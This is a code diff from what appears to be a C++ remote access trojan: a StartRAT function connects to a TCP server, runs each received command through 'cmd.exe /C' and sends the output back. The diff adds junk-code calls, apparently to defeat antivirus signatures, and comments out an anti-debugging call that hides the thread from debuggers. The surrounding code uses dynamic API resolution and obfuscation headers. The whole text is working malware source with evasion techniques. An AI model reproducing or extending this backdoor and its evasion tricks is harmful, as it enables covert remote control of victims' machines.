@@ -4,13 +4,16 @@
 #include "utils.h"
 #include "winapi_function_signatures.h"
 #include "winapi_obfuscation.h"
+#include "junk_codes.h"
 
 #define HideThreadFromDebugger 0x11
 
 DWORD WINAPI StartRAT(LPVOID lpParam)
 {
-	GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>("GetCurrentThread");
-	resolve_dynamically<NtSetInformationThread_t>("NtSetInformationThread", NTDLL_STR)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
+	suspicious_junk_3();
+	
+	//GetCurrentThread_t GetCurrentThread_ptr = resolve_dynamically<GetCurrentThread_t>("GetCurrentThread");
+	//resolve_dynamically<NtSetInformationThread_t>("NtSetInformationThread", NTDLL_STR)(GetCurrentThread_ptr(), HideThreadFromDebugger, 0, 0);
 
 	TCPClient* conn = new TCPClient("127.0.0.1", 54000);
 	conn->start_connection();
@@ -19,8 +22,14 @@ DWORD WINAPI StartRAT(LPVOID lpParam)
 	{
 		// recv command from server
 		std::string commandLine = "cmd.exe /C ";
+
+		suspicious_junk_1(); 
+
 		commandLine.append(conn->recv_data());
+
 		std::string result = exec(commandLine);
+
+		not_inlined_junk_func_2(0.456f);
 
 		// send result back to server
 		conn->send_data(result);
